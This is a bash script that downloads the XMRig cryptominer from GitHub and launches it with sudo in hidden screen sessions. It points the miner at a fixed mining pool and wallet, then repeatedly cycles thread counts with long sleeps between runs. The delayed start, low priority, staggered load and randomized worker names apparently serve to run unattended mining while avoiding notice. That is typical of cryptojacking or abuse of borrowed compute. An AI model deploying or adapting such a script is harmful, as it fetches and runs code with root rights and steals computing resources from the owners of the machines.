#!/bin/bash

curl https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz -L -O -J
tar -xf xmrig-6.20.0-linux-x64.tar.gz
cd ./xmrig-6.20.0
sleep 1800
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=4 -k --randomx-1gb-pages
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=8 -k --randomx-1gb-pages
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 sudo ./xmrig --algo="gr" -o stratum-eu.rplant.xyz:17028 -u MLD4T8FBXQyjHiuRqxxf7CfERVZ3Nwj9eh.Aluxy$RANDOM -p x --tls --threads=2 -k --randomx-1gb-pages
sleep 7200
